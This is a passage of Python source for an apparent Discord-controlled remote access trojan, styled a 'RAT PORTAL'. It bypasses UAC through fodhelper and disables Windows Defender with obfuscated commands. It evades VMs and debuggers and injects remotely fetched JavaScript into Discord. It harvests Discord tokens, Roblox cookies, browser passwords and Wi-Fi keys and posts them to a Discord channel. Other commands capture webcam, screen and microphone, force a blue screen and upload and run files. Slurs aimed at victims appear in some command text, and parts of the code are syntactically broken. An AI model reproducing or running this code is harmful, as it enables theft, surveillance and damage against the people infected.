            value_lines.append(stripped_line[len(label)+1:].strip())
            capture = True
        elif capture:
            if line.startswith(" ") or line.startswith("\t"):
                value_lines.append(stripped_line)
            else:
                break

    return "\n".join(value_lines) if value_lines else None

def get_os_version(output):
    return get_value_by_label("OS Version", output)

def get_os_manufacturer(output):
    return get_value_by_label("OS Manufacturer", output)

def get_os_configuration(output):
    return get_value_by_label("OS Configuration", output)

def get_os_build_type(output):
    return get_value_by_label("OS Build Type", output)

def get_registered_owner(output):
    return get_value_by_label("Registered Owner", output)

def get_registered_organization(output):
    return get_value_by_label("Registered Organization", output)

def get_product_id(output):
    return get_value_by_label("Product ID", output)

def get_original_install_date(output):
    return get_value_by_label("Original Install Date", output)

def get_system_boot_time(output):
    return get_value_by_label("System Boot Time", output)

def get_system_manufacturer(output):
    return get_value_by_label("System Manufacturer", output)

def get_system_model(output):
    return get_value_by_label("System Model", output)

def get_system_type(output):
    return get_value_by_label("System Type", output)

def get_processors(output):
    return get_value_by_label("Processor(s)", output)

def get_bios_version(output):
    return get_value_by_label("BIOS Version", output)

def get_windows_directory(output):
    return get_value_by_label("Windows Directory", output)

def get_system_directory(output):
    return get_value_by_label("System Directory", output)

def get_boot_device(output):
    return get_value_by_label("Boot Device", output)

def get_system_locale(output):
    return get_value_by_label("System Locale", output)

def get_input_locale(output):
    return get_value_by_label("Input Locale", output)

def get_time_zone(output):
    return get_value_by_label("Time Zone", output)

def get_available_physical_memory(output):
    return get_value_by_label("Available Physical Memory", output)

def get_virtual_memory_max_size(output):
    return get_value_by_label("Virtual Memory: Max Size", output)

def get_virtual_memory_available(output):
    return get_value_by_label("Virtual Memory: Available", output)

def get_virtual_memory_in_use(output):
    return get_value_by_label("Virtual Memory: In Use", output)

def get_page_file_locations(output):
    return get_value_by_label("Page File Location(s)", output)

def get_domain(output):
    return get_value_by_label("Domain", output)

def get_logon_server(output):
    return get_value_by_label("Logon Server", output)

def get_hotfixes(output):
    return get_value_by_label("Hotfix(s)", output)

def get_network_cards(output):
    return get_value_by_label("Network Card(s)", output)

def get_hyperv_requirements(output):
    return get_value_by_label("Hyper-V Requirements", output)

def get_battery_percentage(output):
    return get_value_by_label("Battery Percentage", output)

def uac_bypass(program="cmd.exe /c start powershell.exe"):
    reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, program)
        winreg.CloseKey(key)
        subprocess.run(["C:\\Windows\\System32\\fodhelper.exe"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(3)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command")
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open")
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell")
    except Exception:
        pass

def injection_init():
    appdata = os.getenv('LOCALAPPDATA')
    discord_dirs = [
        appdata + '\\Discord',
        appdata + '\\DiscordCanary',
        appdata + '\\DiscordPTB',
        appdata + '\\DiscordDevelopment'
    ]

    code = requests.get('https://raw.githubusercontent.com/skiddozzzzzzzz/Injection/refs/heads/main/index.js').text

    for proc in psutil.process_iter():
        if 'discord' in proc.name().lower():
            try:
                proc.kill()
            except:
                pass

    for dir in discord_dirs:
        if not os.path.exists(dir):
            continue

        core = get_core(dir)
        if core is not None:
            with open(core[0] + '\\index.js', 'w', encoding='utf-8') as f:
                f.write(code.replace('discord_desktop_core-1', core[1]).replace('%WEBHOOK%', hook))
            start_discord(dir)

channel_id = "1423236150101020704"

def monitor_accounts():
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")

    PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Lightcord': ROAMING + '\\Lightcord',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
    'Iridium': LOCAL + '\\Iridium\\User Data',
    'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles',
    'Roblox': LOCAL + '\\Roblox'
}

    TOKEN_PATTERN = re.compile(rb"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
    previous_discord_tokens = set()
    previous_roblox_cookies = set()
    previous_discord_passwords = {}
    previous_roblox_passwords = {}

    def decrypt_password(encrypted_value):
        try:
            if encrypted_value[:3] == b'v10':  # Chrome/Edge encrypted
                encrypted_value = encrypted_value[3:]
            return CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
        except:
            return "Could not decrypt"

    def grab_browser_passwords(browser_path, firefox=False):
        credentials = {}
        if not os.path.exists(browser_path):
            return credentials
        if firefox:
            # Firefox: stored in logins.json
            logins_path = os.path.join(browser_path, "logins.json")
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, "r", encoding="utf-8") as f:
                        data = json.load(f)
                        for login in data.get("logins", []):
                            username = login.get("username", "")
                            password = login.get("password", "")
                            if username and password:
                                credentials[username] = password
                except:
                    pass
        else:
            login_db = os.path.join(browser_path, "Default", "Login Data")
            if not os.path.exists(login_db):
                return credentials
            tmp_db = os.path.join(os.getenv("TEMP"), "tmp_login_db")
            try:
                shutil.copy2(login_db, tmp_db)
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT username_value, password_value FROM logins")
                for username, password in cursor.fetchall():
                    if username and password:
                        credentials[username] = decrypt_password(password)
                cursor.close()
                conn.close()
            except:
                pass
            finally:
                if os.path.exists(tmp_db):
                    os.remove(tmp_db)
        return credentials

    async def send_embed(client, title, fields, avatar_url=None, thumbnail_url=None):
        channel = client.get_channel(int(channel_id))
        embed = discord.Embed(title=title, color=discord.Color.purple())
        for name, value, inline in fields:
            embed.add_field(name=name, value=value, inline=inline)
        if avatar_url:
            embed.set_thumbnail(url=avatar_url)
        if thumbnail_url:
            embed.set_image(url=thumbnail_url)
        await channel.send(embed=embed, content="@everyone")

    def grab_discord_tokens():
        tokens = set()
        for key, path in PATHS.items():
            if not os.path.exists(path): continue
            if 'Firefox' in key:
                for folder in os.listdir(path):
                    profile = os.path.join(path, folder)
                    leveldb = os.path.join(profile, "storage", "default", "https+++discord.com", "idb")
                    if not os.path.exists(leveldb): continue
                    for file in os.listdir(leveldb):
                        try:
                            with open(os.path.join(leveldb, file), "rb") as f:
                                tokens.update([t.decode() for t in TOKEN_PATTERN.findall(f.read())])
                        except: continue
            else:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith((".log", ".ldb", ".sqlite")):
                            try:
                                with open(os.path.join(root, file), "rb") as f:
                                    tokens.update([t.decode() for t in TOKEN_PATTERN.findall(f.read())])
                            except: continue
        return tokens

    def grab_roblox_cookies():
        cookies = set()
        roblox_path = PATHS['Roblox']
        if os.path.exists(roblox_path):
            for file in os.listdir(roblox_path):
                if file.endswith(".ROBLOSECURITY"):
                    try:
                        with open(os.path.join(roblox_path, file), "r", errors="ignore") as f:
                            cookies.add(f.read().strip())
                    except: continue
        return cookies

    async def monitor(client):
        nonlocal previous_discord_tokens, previous_roblox_cookies
        while True:
            # Discord detection
            tokens = grab_discord_tokens()
            new_tokens = tokens - previous_discord_tokens
            for token in new_tokens:
                try:
                    headers = {"Authorization": token}
                    user_resp = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
                    if not user_resp.ok: continue
                    user_data = user_resp.json()

                    passwords = {}
                    passwords.update(grab_browser_passwords(PATHS['Chrome']))
                    passwords.update(grab_browser_passwords(PATHS['Edge']))
                    for folder in os.listdir(PATHS['Firefox']):
                        passwords.update(grab_browser_passwords(os.path.join(PATHS['Firefox'], folder), firefox=True))

                    password = passwords.get(user_data.get('email'), 'N/A')
                    old_password = previous_discord_passwords.get(user_data['id'], 'N/A')
                    previous_discord_passwords[user_data['id']] = password

                    fields = [
                        ("👤 Username", f"{user_data.get('username')}#{user_data.get('discriminator')}", True),
                        ("✉ Email", f"{user_data.get('email','N/A')}", True),
                        ("🔑 Token", f"`{token}`", False),
                        ("🔒 2FA Enabled", "✅" if user_data.get('mfa_enabled') else "❌", True),
                        ("🗂 Backup Codes", "\n".join(user_data.get("backup_codes", [])) or "None", False),
                        ("🔑 Previous Password", f"`{old_password}`", False),
                        ("🔑 Current Password", f"`{password}`", False)
                    ]
                    avatar = f"https://cdn.discordapp.com/avatars/{user_data.get('id')}/{user_data.get('avatar')}.png"
                    await send_embed(client, "🟣 Discord Account Update Detected", fields, avatar_url=avatar)
                except: continue
            previous_discord_tokens = tokens

            cookies = grab_roblox_cookies()
            new_cookies = cookies - previous_roblox_cookies
            for cookie in new_cookies:
                try:
                    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
                    r = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers, timeout=5)
                    if not r.ok: continue
                    data = r.json()

                    passwords = {}
                    passwords.update(grab_browser_passwords(PATHS['Chrome']))
                    passwords.update(grab_browser_passwords(PATHS['Edge']))
                    for folder in os.listdir(PATHS['Firefox']):
                        passwords.update(grab_browser_passwords(os.path.join(PATHS['Firefox'], folder), firefox=True))

                    password = passwords.get(data.get('UserName',''), 'N/A')
                    old_password = previous_roblox_passwords.get(data.get('UserID'), 'N/A')
                    previous_roblox_passwords[data.get('UserID')] = password

                    fields = [
                        ("👤 Username", f"{data.get('UserName','N/A')}", True),
                        ("🔑 Cookie", f"`{cookie}`", False),
                        ("💰 Robux Balance", f"{data.get('RobuxBalance','N/A')}", True),
                        ("🗂 Backup Codes", "\n".join(data.get('BackupCodes', [])) if data.get('BackupCodes') else "None", False),
                        ("🔑 Previous Password", f"`{old_password}`", False),
                        ("🔑 Current Password", f"`{password}`", False)
                    ]
                    thumbnail = f"https://www.roblox.com/headshot-thumbnail/image?userId={data.get('UserID','0')}&width=150&height=150&format=png"
                    await send_embed(client, "🟣 Roblox Account Update Detected", fields, thumbnail_url=thumbnail)
                except: continue
            previous_roblox_cookies = cookies

    return monitor

def disable_defender():
    cmd = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode()
    subprocess.run(cmd, shell=True, capture_output=True)

def disable_defenderv2():
    try:
        key_path = r"Software\Policies\Microsoft\Windows Defender"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_ALL_ACCESS)

        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableAntiVirus", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)

        winreg.CloseKey(key)

        os.system("wscui.cpl /DisableAntiSpyware")
        os.system("wscui.cpl /DisableAntiVirus")
        os.system("wscui.cpl /DisableRealtimeMonitoring")

def disable_windows_security():
    try:
        key_path = r"Software\Policies\Microsoft\Windows Security"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)

        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableAntiVirus", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)

        winreg.CloseKey(key)
        

def antivm_antidebug():
    try:
        vm_processes = [
            "vboxservice.exe","vboxtray.exe",
            "vmtoolsd.exe","vmwaretray.exe",
            "qemu-ga.exe","xenservice.exe",
            "xenbus.exe","prl_cc.exe","prl_tools.exe",
            "vmmouse.exe","vmware.exe","vboxclient.exe",
            "hyperv.exe","parallels.exe"
        ]
        for p in vm_processes:
            try:
                out = subprocess.check_output(f'tasklist /FI "IMAGENAME eq {p}"', shell=True).decode()
                if p.lower() in out.lower(): return True
            except: continue

        cpu_info = platform.processor()
        if any(x in cpu_info.lower() for x in ["virtual","vmware","vbox","qemu","hyperv","parallels"]): return True

        mac = ':'.join(['%02x' % ((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
        if any(mac.lower().startswith(x) for x in [
            "00:05:69","00:0c:29","00:50:56","08:00:27","52:54:00",
            "00:1c:42","00:03:ff"
        ]): return True

        sandbox_vars = ["VBOX", "VMWARE", "XEN", "HYPERV", "PARALLELS", "QEMU"]
        for var in sandbox_vars:
            if any(var in str(os.environ.get(k,"")).upper() for k in os.environ): return True

        sandbox_hostnames = ["VBOX", "VMWARE", "DESKTOP-VM", "XEN", "PARALLELS"]
        for name in sandbox_hostnames:
            if name.lower() in socket.gethostname().lower(): return True

        try:
            total_bytes = os.statvfs(os.getcwd()).f_blocks * os.statvfs(os.getcwd()).f_frsize
            if total_bytes < 60 * 1024**3: return True
        except: pass

        if 'winreg' in globals():
            reg_paths = [
                r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
                r"SYSTEM\CurrentControlSet\Services\VMMouse",
                r"SYSTEM\CurrentControlSet\Services\vmhgfs",
                r"SYSTEM\CurrentControlSet\Services\vmci",
                r"SYSTEM\CurrentControlSet\Services\VBoxService",
                r"SYSTEM\CurrentControlSet\Services\VBoxSF",
                r"SYSTEM\CurrentControlSet\Services\vmusb",
            ]
            for path in reg_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    winreg.CloseKey(key)
                    return True
                except: continue

        if 'wmi' in globals():
            try:
                c = wmi.WMI()
                for system in c.Win32_ComputerSystem():
                    manufacturer = system.Manufacturer.lower()
                    model = system.Model.lower()
                    if any(x in manufacturer for x in ["microsoft corporation","vmware, inc.","virtualbox","xen","parallels"]): return True
                    if any(x in model for x in ["virtual","vmware","vbox","hyper-v","xen","parallels"]): return True
                for bios in c.Win32_BIOS():
                    if any(x in bios.SerialNumber.lower() for x in ["vmware","vbox","virtual","xen","parallels"]): return True
                    if any(x in bios.Manufacturer.lower() for x in ["vmware","vbox","virtual","xen","parallels"]): return True
                for adapter in c.Win32_NetworkAdapter():
                    if any(x in str(adapter.Name).lower() for x in ["virtual","vmware","vbox","hyper-v","parallels","qemu"]): return True
                for gpu in c.Win32_VideoController():
                    if any(x in str(gpu.Name).lower() for x in ["vmware","virtual","vbox","qemu","hyper-v"]): return True
                for disk in c.Win32_DiskDrive():
                    if any(x in str(disk.SerialNumber).lower() for x in ["vmware","vbox","virtual","qemu"]): return True
                for battery in c.Win32_Battery():
                    if battery.BatteryStatus != 1: return True
            except: pass

        if hasattr(sys, 'gettrace') and sys.gettrace(): return True
        if 'ctypes' in globals():
            try:
                kernel32 = ctypes.windll.kernel32
                if kernel32.IsDebuggerPresent() != 0: return True
            except: pass

        t1 = time.time()
        time.sleep(0.2)
        t2 = time.time()
        if (t2 - t1) > 0.5: return True

    except: return True
    return False

if antivm_antidebug():
    sys.exit()
    
def gather_info():
    wifi_names=[]; info={}
    if platform.system()=="Windows":
        try:
            data=subprocess.check_output(["netsh","wlan","show","profiles"], shell=True, text=True)
            wifi_names=[line.split(":")[1].strip() for line in data.splitlines() if "All User Profile" in line]
        except: wifi_names=["Could not fetch Wi-Fi"]
    else: wifi_names=["N/A"]
    gpus=GPUtil.getGPUs(); gpu_info=", ".join([f"{g.name}({g.memoryTotal}MB)" for g in gpus]) if gpus else "N/A"
    local_ip=socket.gethostbyname(socket.gethostname())
    mac_addr=':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,48,8)][::-1])
    cpu_cores=psutil.cpu_count(logical=False)
    emails=[]
    try:
        for user_folder in [Path.home()]:
            for profile in user_folder.glob("**/Login Data"):
                emails.append(str(profile))
        if not emails: emails=["No emails found"]
    except: emails=["Could not fetch emails"]
    try:
        history=bh.get_browserhistory()
        history_text="; ".join([str(history[k][:5]) for k in history.keys()])[:500]
    except: history_text="Could not fetch browser history"
    info.update({"Username":platform.node(),"Hostname":socket.gethostname(),"OS":f"{platform.system()} {platform.release()}",
                 "Processor":platform.processor(),"CPU Cores":cpu_cores,"RAM(GB)":round(psutil.virtual_memory().total/(1024**3),2),
                 "Local IP":local_ip,"Public IP":get_public_ip(),"MAC":mac_addr,"GPU":gpu_info,"Wi-Fi Names":", ".join(wifi_names),
                 "Browser History":history_text,"Emails":"; ".join(emails)})
    return info

def get_logins():
    logins = []
    decrypted = []

    try:
        chrome_login = Path.home().joinpath("AppData/Local/Google/Chrome/User Data/Default/Login Data")
        if chrome_login.exists(): logins.append(("Chrome", str(chrome_login)))

        edge_login = Path.home().joinpath("AppData/Local/Microsoft/Edge/User Data/Default/Login Data")
        if edge_login.exists(): logins.append(("Edge", str(edge_login)))

        firefox_profiles = Path.home().joinpath("AppData/Roaming/Mozilla/Firefox/Profiles")
        if firefox_profiles.exists():
            for profile in firefox_profiles.iterdir(): logins.append(("Firefox", str(profile)))

        if not logins: return ["No login data found"]

        for browser, path in logins:
            if browser in ["Chrome", "Edge"]:
                try:
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url, username, password_encrypted = row
                        try:
                            password = win32crypt.CryptUnprotectData(password_encrypted, None, None, None, 0)[1].decode()
                        except:
                            password = "Could not decrypt"
                        decrypted.append((browser, url, username, password))
                    conn.close()
                except:
                    continue
            else:
                decrypted.append((browser, path, "N/A", "Cannot decrypt Firefox passwords"))

    except:
        return ["Could not fetch logins"]

    return decrypted
    
def get_wifi_passwords():
    wifi_info={}
    if platform.system()!="Windows": return {"Error":"Only Windows supported"}
    try:
        data=subprocess.check_output(["netsh","wlan","show","profiles"], shell=True, text=True)
        profiles=[line.split(":")[1].strip() for line in data.splitlines() if "All User Profile" in line]
        for profile in profiles:
            try:
                result=subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True)
                pwd_line=[line for line in result.splitlines() if "Key Content" in line]
                password=pwd_line[0].split(":")[1].strip() if pwd_line else "N/A"
                wifi_info[profile]=password
            except: wifi_info[profile]="N/A"
    except: wifi_info["Error"]="Could not fetch Wi-Fi passwords"
    return wifi_info

async def send_bot_embed(bot, guild, info=None, files=[]):
    if info is None:
        info = {}

    try:
        infos_channel = discord.utils.get(guild.text_channels, name="・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ")
        if infos_channel is None:
            return

        embed = discord.Embed(
            title="System Info",
            color=0x00ff00
        )
        for k, v in info.items():
            embed.add_field(name=k, value=str(v), inline=False)

        await infos_channel.send(embed=embed)

        for f in files:
            try:
                os.remove(f)
            except:
                pass
    except:
        pass

def webcam_snapshots(duration=5, interval=1):
    cam = cv2.VideoCapture(0); snapshots = []; start=time.time(); count=0
    while time.time()-start < duration:
        ret, frame = cam.read()
        if ret:
            path=tempfile.NamedTemporaryFile(delete=False, suffix=f"_cam{count}.png").name
            cv2.imwrite(path, frame); snapshots.append(path); count+=1
        time.sleep(interval)
    cam.release(); return snapshots

def screen_snapshots(duration=5, interval=1):
    snapshots=[]; start=time.time(); count=0
    while time.time()-start < duration:
        img=pyautogui.screenshot()
        path=tempfile.NamedTemporaryFile(delete=False, suffix=f"_screen{count}.png").name
        img.save(path); snapshots.append(path); count+=1; time.sleep(interval)
    return snapshots

def monitor_video(duration=5):
    return screen_snapshots(duration,1)+webcam_snapshots(duration,1)

def record_voice(duration=5):
    try: rec=sd.rec(int(duration*44100), samplerate=44100, channels=2); sd.wait()
    except: return None
    path=tempfile.NamedTemporaryFile(delete=False, suffix=".wav").name
    wav_write(path,44100,rec); return path

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
executor = ThreadPoolExecutor(max_workers=100)
tree = bot.tree
vc_connection = None
vc_listener = None

@bot.event
async def on_ready():
    try:
        await bot.tree.sync()
    except: pass

    print(f"{Fore.MAGENTA}loading files this may take a while...")
    guild = bot.guilds[0]

    category = discord.utils.get(guild.categories, name='═══ ・➣ 🐀 RAT PORTAL・')
    if not category:
        category = await guild.create_category('═══ ・➣ 🐀 RAT PORTAL・')

        channel_names = ['・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ', '・⌨│ᴛᴇʀᴍɪɴᴀʟ', '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ', '・🔑│ᴋᴇʏʟᴏɢꜱ', '・🔔│ʀᴀᴛ-ʟᴏɢꜱ']
        for name in channel_names:
            await guild.create_text_channel(name, category=category)

    system_name = socket.gethostname()
    public_ip = get_public_ip()
    system_ip = socket.gethostbyname(socket.gethostname())
    try:
    resp = requests.get(f"http://ip-api.com/json/{public_ip}").json()
    general_location = f"{resp.get('country','N/A')}, {resp.get('regionName','N/A')}, {resp.get('city','N/A')}"
    address = f"{resp.get('zip','N/A')} {resp.get('city','N/A')}, {resp.get('regionName','N/A')}, {resp.get('country','N/A')}"
except:
    general_location = "N/A"
    address = "N/A"
    device_logs_channel = discord.utils.get(category.channels, name='・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ')
    if device_logs_channel:
        embed = discord.Embed(title='🔵 Rat is Online', color=0xFF0000)
embed.add_field(name='🖥️ System Name', value=f'```{system_name}```', inline=False)
embed.add_field(name='👀 IP Address', value=f'```{public_ip}```', inline=False)
embed.add_field(name='🌐 System IP Address', value=f'```{system_ip}```', inline=False)
embed.add_field(name='📍 General Location', value=f'```{general_location}```', inline=False)
embed.add_field(name='🏠 Address', value=f'```{address}```', inline=False)

current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
footer_text = f'RAT | Date: {current_time}'
embed.set_footer(text=footer_text)

await device_logs_channel.send(embed=embed)


@bot.tree.command(name="infos", description="get system info")
async def infos(interaction: discord.Interaction):
    info = gather_info()
    info.update(get_wifi_passwords())
    await send_bot_embed(interaction.client, None, info)
    await interaction.response.send_message("✅ Infos sent.", ephemeral=True)
    
@bot.tree.command(name="logins", description="Send login infos from apps/browsers")
async def login(interaction: discord.Interaction):
    logins = get_logins()
    for entry in logins:
        if isinstance(entry, tuple):
            browser, url_or_profile, username, password = entry
            embed = discord.Embed(
                title=f"🟣 {browser} Login Data",
                color=discord.Color.purple()
            )
            embed.add_field(name="🟣 URL / Profile", value=url_or_profile, inline=False)
            embed.add_field(name="🟣 Username", value=username or "N/A", inline=True)
            embed.add_field(name="🟣 Password", value=password or "N/A", inline=True)
            await interaction.channel.send(embed=embed)
        else:
            embed = discord.Embed(
                title="🟣 Login Data",
                description=str(entry),
                color=discord.Color.purple()
            )
            await interaction.channel.send(embed=embed)

    await interaction.response.send_message("✅ Login info sent.", ephemeral=True)
    
@bot.tree.command(name="wifi", description="Show Wi-Fi names and passwords")
async def wifi(interaction: discord.Interaction):
    info=get_wifi_passwords(); send_bot_embed(info=info)
    await interaction.response.send_message("✅ Wi-Fi info sent.", ephemeral=True)

@bot.tree.command(name="browser_history", description="Send browser history")
async def browser_history(interaction: discord.Interaction):
    try: history=bh.get_browserhistory(); history_text="; ".join([str(history[k][:5]) for k in history.keys()])[:500]
    except: history_text="Could not fetch browser history"
    send_embed_embed(info={"Browser History":history_text})
    await interaction.response.send_message("✅ Browser history sent.", ephemeral=True)

@bot.tree.command(name="webcam_vid", description="Take webcam snapshots/video")
async def webcam_vid(interaction: discord.Interaction, duration:int=5):
    snaps=webcam_snapshots(duration); send_bot_embed(files=snaps)
    await interaction.response.send_message(f"✅ Webcam snapshots sent ({duration}s).", ephemeral=True)

@bot.tree.command(name="video_capture", description="Take screen/video capture")
async def video_capture(interaction: discord.Interaction, duration:int=5):
    snaps=screen_snapshots(duration); send_bot_embed(files=snaps)
    await interaction.response.send_message(f"✅ Screen snapshots sent ({duration}s).", ephemeral=True)

@bot.tree.command(name="monitor", description="Monitor screen+webcam")
async def monitor(interaction: discord.Interaction, duration:int=5):
    snaps=monitor_video(duration); send_bot_embed(files=snaps)
    await interaction.response.send_message(f"✅ Monitoring sent ({duration}s).", ephemeral=True)

@bot.tree.command(name="send_voicefiles", description="Record voice")
async def send_voicefiles(interaction: discord.Interaction, duration:int=5):
    path=record_voice(duration); send_bot_embed(files=[path] if path else [])
    await interaction.response.send_message(f"✅ Voice file sent ({duration}s).", ephemeral=True)

@bot.tree.command(name="message", description="Send message to ratted victim")
async def message(interaction: discord.Interaction, *, msg: str):
    ctypes.windll.user32.MessageBoxW(0, f"{msg}", "Notification", 0x40 | 0x1)
    await interaction.response.send_message("✅ Message sent.", ephemeral=True)
    
@bot.tree.command(name="wallpaper", description="Change wallpaper")
async def wallpaper(interaction: discord.Interaction, url:str):
    return
    try:
        path=tempfile.NamedTemporaryFile(delete=False, suffix=".bmp").name
        data=urllib.request.urlopen(url).read()
        with open(path,"wb") as f: f.write(data)
        if platform.system()=="Windows": import ctypes; ctypes.windll.user32.SystemParametersInfoW(20,0,path,3)
        send_bot_embed(info={"Wallpaper Changed": url})
    except: pass
    await interaction.response.send_message("✅ Wallpaper changed.", ephemeral=True)

@bot.tree.command(name="open", description="Open URL in browser")
async def open_url(interaction: discord.Interaction, url:str):
    webbrowser.open(url)
    await interaction.response.send_message(f"✅ URL opened: {url}", ephemeral=True)

@bot.tree.command(name="play_sound", description="Play sound from URL")
play_sound(interaction: discord.Interaction, url: str):
    try:
        path=tempfile.NamedTemporaryFile(delete=False, suffix=".wav").name
        data=urllib.request.urlopen(url).read()
        with open(path,"wb") as f: f.write(data)
        os.system(f'start /min wmplayer "{path}"') if platform.system()=="Windows" else os.system(f'afplay "{path}"')
        send_bot_embed(info={"Sound Played": url})
    except: pass
    await interaction.response.send_message("✅ Sound played.", ephemeral=True)

@bot.tree.command(name="bluescreen", description="Shows blue screen to ratted retard")
async def bluescreen(interaction: discord.Interaction):
    await interaction.response.send_message("Ratted Retard Has Gotten The Blue Screen Of Death👀...", ephemeral=True)
    def bsod():
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xc000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint()))

@bot.tree.command(name="disable_reagentc", description="Disable Windows Recovery Environment (WinRE).")
async def disable_re(interaction: discord.Interaction):
    def reagentc_disable():
        try:
            result = subprocess.run(
                ["reagentc", "/disable"],
                capture_output=True, text=True, check=True
            )
            return True, result.stdout
        except subprocess.CalledProcessError as e:
            return False, e.stderr

    success, output = reagentc_disable()

    embed = discord.Embed(
        title="🟣 Successfully Disabled REAgentC." if success else "🟣 Failed to Disable REAgentC.",
        color=discord.Color.purple()
    )
    embed.add_field(
        name="Output" if success else "Error",
        value=f"```{output}```",
        inline=False
    )

    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="run_as_admin", description="Run a file as Administrator.")
@app_commands.describe(program="Program filename")
async def runasadmin(interaction: discord.Interaction, program: str):
    SHELLEXECUTEW = ctypes.windll.shell32.ShellExecuteW
    SW_SHOWNORMAL = 1

    result = SHELLEXECUTEW(None, "runas", program, None, None, SW_SHOWNORMAL)

    embed = discord.Embed(
        title="🟣 Successfully launched as Admin" if result > 32 else "❌ Failed to run as Admin",
        description=f"Program: `{program}`\nResult Code: `{result}`",
        color=discord.Color.purple()
    )
    await interaction.response.send_message(embed=embed)
    
@bot.tree.command(name="add_a_file", description="Upload a file and run it to ratted pc.")
async def add_a_file(interaction: discord.Interaction):
    await interaction.response.send_message(
        "📂 Upload a file below to add it and run it (supports .py, .exe, .bat, .txt, or gofile.io link).",
        ephemeral=True
    )

    def check(msg: discord.Message):
        return (
            msg.author == interaction.user
            and (msg.attachments or "gofile.io" in msg.content)
        )

    msg = await client.wait_for("message", check=check)

    os.makedirs("uploaded_files", exist_ok=True)

    if msg.attachments:
        file = msg.attachments[0]
